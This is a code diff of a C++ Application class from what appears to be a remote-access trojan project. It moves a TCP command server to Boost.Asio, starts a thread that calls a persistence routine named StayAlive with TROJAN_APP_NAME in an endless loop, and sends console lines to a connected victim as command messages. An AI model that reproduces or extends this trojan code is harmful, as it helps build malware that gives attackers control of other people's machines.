@@ -1,60 +1,47 @@
-#include "..\pch.h"
+#include "..\Service\pch.hpp"
 
 #include "Application.hpp"
-#include "..\Network.hpp"
-#include "Commands.hpp"
-#include "..\Tools.hpp"
-#include "..\Debugger.h"
-#include "..\Constants.h"
-/*
-BOOL Application::startSavingThread()
-{
-	if (!CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(&StayAlive), TROJAN_APP_NAME, 0, NULL))
-	{
-		PrintError(TEXTH("CreateThread"), GetLastError());
-
-		return FALSE;
-	}
-
-	return TRUE;
-}
+#include "..\Network\TCPServer.hpp"
+#include "..\Network\Protocols\CommandMessageProtocol.hpp"
+#include "..\Service\Debugger.hpp"
+#include "..\Service\Constants.h"
+#include "..\Service\Tools.hpp"
 
 Application::Application() :
-	m_pTCPServer(new TCPServer)
-{
-}
+	m_io(),
+	m_server(new TCPServer(m_io, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), std::atoi(DEFAULT_PORT)))),
+	m_thread([this]() { m_io.run(); }),
+	m_save_thread([]() { for (;;) { StayAlive(TROJAN_APP_NAME); } })
+{ }
+
+Application::Application(char *argv[]) :
+	m_io(),
+	m_server(new TCPServer(m_io, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), std::atoi(argv[1])))),
+	m_thread([this]() { m_io.run(); }),
+	m_save_thread([]() { for (;;) { StayAlive(TROJAN_APP_NAME); } })
+{ }
 
 Application::~Application()
 {
-	delete m_pTCPServer;
-
-	WSACleanup();
+	delete m_server;
 }
 
-BOOL Application::init()
+void Application::run()
 {
-	if(!startSavingThread())
-		return FALSE;
-
-	WSADATA wsaData;
-	INT iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
-	if (iResult != 0)
+	m_server->accept();
+	
+	char line[CMPROTO::MAX_BODY_LENGTH + 1] = "";
+	while (std::cin.getline(line, CMPROTO::MAX_BODY_LENGTH + 1))
 	{
-		$error _tprintf(TEXTH("WSAStartup failed with error: %d\n"), iResult);
+		CMPROTO msg;
+		msg.set_body_length(std::strlen(line));
+		std::memcpy(msg.get_body(), line + CMPROTO::HEADER_LENGTH, msg.get_body_length());
+		msg.encode_header();
 
-		return FALSE;
+		m_server->write(&msg);
 	}
-	$I(TEXTH("WSAStartup finished\n"));
 
-	if(!m_pTCPServer->init())
-		return FALSE;
-
-	return TRUE;
-}
-
-VOID Application::run()
-{
-	ClearConsole();
+	/*ClearConsole();
 
 	std::string msg(TCP_MESSAGE_LENGTH, { });
 	std::stringstream sstr;
@@ -100,6 +87,11 @@ VOID Application::run()
 
 		system("pause"); // SleepEx(10000, FALSE);
 		ClearConsole();
-	}
+	}*/
 }
-*/
+
+void Application::close()
+{
+	m_thread.join();
+	m_save_thread.join();
+}
